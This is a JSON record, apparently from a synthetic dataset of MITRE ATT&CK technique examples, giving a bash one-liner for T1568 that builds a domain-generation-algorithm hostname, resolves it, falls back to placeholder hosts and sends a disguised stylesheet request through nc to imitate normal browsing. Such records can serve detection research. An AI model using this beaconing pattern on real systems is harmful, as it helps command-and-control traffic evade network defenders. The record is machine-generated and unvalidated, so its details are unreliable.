{
  "technique_id": "T1568",
  "platform": "Linux",
  "shell": "bash",
  "command": "bash -c \"tld=$(printf 'com\\nnet\\norg\\nio\\ninfo' | shuf -n1); seed=$(date -u +%j%H%M)${RANDOM}; sha=$(printf '%s' \\\"$seed\\\" | sha1sum | cut -d' ' -f1); d=\\\"${sha:0:8}.$tld\\\"; host=''; ip=''; for h in \\\"$d\\\" cdn-images.example.$tld static-content.example.$tld; do ip=$(dig +short \\\"$h\\\" | head -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ip=${ip:-198.51.100.23}; host=${host:-mirror.example.$tld}; ua=\\\"Mozilla/5.0\\\"; printf 'GET /style.css HTTP/1.1\\r\\nHost: %s\\r\\nAccept: text/css,*/*;q=0.1\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
  "explanation": "Builds a TLD-rotating DGA domain, resolves it at runtime, and falls back to a reserved documentation IP if DNS fails; uses a CSS fetch to mimic normal browsing activity.",
  "rationale_steps": [
    "Select TLD randomly and derive a DGA domain using a time-based seed.",
    "Resolve domain with dig; if it fails, use a fallback IP.",
    "Leverage Host header for virtual hosting to emulate a CDN asset.",
    "Send realistic HTTP GET for a stylesheet via nc."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1568-213026ff-d5e96a0e",
  "source_prompt_hash": "213026ff",
  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
  "validation": {
    "syntax_ok": null,
    "llm_judge": null,
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}